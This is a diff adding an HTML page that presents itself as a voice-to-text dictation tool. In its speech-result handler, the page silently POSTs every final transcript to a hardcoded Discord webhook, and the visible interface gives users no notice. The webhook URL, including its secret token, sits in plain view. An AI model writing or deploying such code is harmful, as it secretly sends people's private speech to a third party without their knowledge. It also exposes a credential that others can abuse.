@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Voice to Text with Webhook</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: white;
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      flex-direction: column;
+      transition: background-color 0.5s;
+    }
+
+    h1 {
+      font-size: 2rem;
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
+    }
+
+    button {
+      background-color: #1e1e1e;
+      color: white;
+      border: 2px solid #00bcd4;
+      padding: 15px 30px;
+      margin: 10px;
+      font-size: 1.2rem;
+      border-radius: 25px;
+      transition: background-color 0.3s, transform 0.2s;
+    }
+
+    button:hover {
+      background-color: #00bcd4;
+      transform: scale(1.1);
+    }
+
+    button:disabled {
+      background-color: #555;
+      cursor: not-allowed;
+    }
+
+    p {
+      font-size: 1.5rem;
+      margin-top: 20px;
+      padding: 10px;
+      background-color: #1c1c1c;
+      border-radius: 15px;
+      width: 80%;
+      text-align: center;
+      min-height: 100px;
+      line-height: 1.5;
+      position: relative;
+    }
+
+    .container {
+      text-align: center;
+      padding: 20px;
+    }
+
+    #word-count {
+      margin-top: 10px;
+      color: #00bcd4;
+    }
+
+    #mode-toggle {
+      background-color: #000;
+      color: white;
+      border: 2px solid #f39c12;
+    }
+
+    #mode-toggle:hover {
+      background-color: #f39c12;
+      color: black;
+    }
+
+    #speed-control {
+      width: 200px;
+      margin-top: 20px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Speak and I'll Write It</h1>
+    <button id="start-btn">Start Listening</button>
+    <button id="stop-btn" disabled>Stop Listening</button>
+    <button id="reset-btn">Reset</button>
+    <button id="copy-btn" disabled>Copy to Clipboard</button>
+    <button id="clear-btn">Clear Text</button>
+    <button id="mode-toggle">Toggle Light/Dark Mode</button>
+    <p id="transcript"></p>
+    <div id="word-count">Words: 0</div>
+    <input type="range" id="speed-control" min="0.5" max="2" step="0.1" value="1">
+    <label for="speed-control" style="color: white;">Speech Speed</label>
+  </div>
+
+  <script>
+    const startBtn = document.getElementById('start-btn');
+    const stopBtn = document.getElementById('stop-btn');
+    const resetBtn = document.getElementById('reset-btn');
+    const copyBtn = document.getElementById('copy-btn');
+    const clearBtn = document.getElementById('clear-btn');
+    const modeToggle = document.getElementById('mode-toggle');
+    const speedControl = document.getElementById('speed-control');
+    const transcriptDisplay = document.getElementById('transcript');
+    const wordCountDisplay = document.getElementById('word-count');
+
+    let darkMode = true;
+    let finalTranscript = "";
+
+    // Voice feedback
+    const speakText = (text) => {
+      const utterance = new SpeechSynthesisUtterance(text);
+      utterance.rate = 1; // Default rate
+      window.speechSynthesis.speak(utterance);
+    };
+
+    // Toggle dark/light mode
+    modeToggle.onclick = function() {
+      darkMode = !darkMode;
+      document.body.style.backgroundColor = darkMode ? '#121212' : '#f0f0f0';
+      document.body.style.color = darkMode ? 'white' : 'black';
+      modeToggle.style.backgroundColor = darkMode ? '#000' : '#f39c12';
+      modeToggle.style.color = darkMode ? 'white' : 'black';
+      speakText(darkMode ? "Switched to dark mode." : "Switched to light mode.");
+    };
+
+    // Speech recognition setup
+    if ('SpeechRecognition' in window || 'webkitSpeechRecognition' in window) {
+      const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+      recognition.continuous = true;
+      recognition.interimResults = true;
+      recognition.lang = 'en-US';
+      recognition.maxAlternatives = 1;
+      recognition.confidenceThreshold = 0.6;
+
+      // Adjust speech speed based on the slider
+      speedControl.oninput = function() {
+        recognition.interimResults = speedControl.value >= 1 ? true : false; // toggle speed sensitivity
+        recognition.lang = 'en-US'; // Default language
+      };
+
+      // Start listening when the start button is clicked
+      startBtn.onclick = function() {
+        recognition.start();
+        startBtn.disabled = true;
+        stopBtn.disabled = false;
+        resetBtn.disabled = false;
+        copyBtn.disabled = false;
+        startBtn.textContent = "Listening...";
+        speakText("Listening for your speech now.");
+      };
+
+      // Stop listening when the stop button is clicked
+      stopBtn.onclick = function() {
+        recognition.stop();
+        startBtn.disabled = false;
+        stopBtn.disabled = true;
+        startBtn.textContent = "Start Listening";
+        speakText("Stopped listening.");
+      };
+
+      // Reset the transcript when the reset button is clicked
+      resetBtn.onclick = function() {
+        finalTranscript = "";
+        transcriptDisplay.textContent = "";
+        wordCountDisplay.textContent = "Words: 0";
+        speakText("Transcript has been reset.");
+      };
+
+      // Clear the transcript when the clear button is clicked
+      clearBtn.onclick = function() {
+        finalTranscript = "";
+        transcriptDisplay.textContent = "";
+        wordCountDisplay.textContent = "Words: 0";
+        speakText("Text has been cleared.");
+      };
+
+      // Handle the speech recognition results
+      recognition.onresult = function(event) {
+        let interimTranscript = "";
+        let finalTranscriptBuffer = "";
+
+        for (let i = event.resultIndex; i < event.results.length; i++) {
+          const transcript = event.results[i][0].transcript;
+          if (event.results[i].isFinal) {
+            finalTranscriptBuffer += transcript + " ";
+          } else {
+            interimTranscript += transcript;
+          }
+        }
+
+        // Update the transcript and word count
+        finalTranscript = finalTranscriptBuffer;
+        transcriptDisplay.textContent = finalTranscript + interimTranscript;
+        wordCountDisplay.textContent = "Words: " + finalTranscript.split(/\s+/).length;
+
+        // Send the final transcript to the webhook automatically
+        if (finalTranscriptBuffer) {
+          const webhookData = {
+            content: `${finalTranscriptBuffer}\n-# Try Voicelogger at https://gioyethedev.github.io/voicy`
+          };
+
+          fetch("https://discord.com/api/webhooks/1307493641219997716/F3xYVAg4pM5udmW3oWP4FY30NAxXpUWWbCD5-qKD7__lADw1H9UvXseipJEaNAE5AYmE", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(webhookData)
+          })
+          .then(response => {
+            if (response.ok) {
+              console.log("Message sent to Discord webhook successfully.");
+            } else {
+              console.error("Error sending message to Discord webhook.");
+            }
+          })
+          .catch(error => {
+            console.error("Network error: ", error);
+          });
+        }
+      };
+
+    } else {
+      alert("Speech Recognition is not supported in this browser.");
+    }
+  </script>
+</body>
+</html>
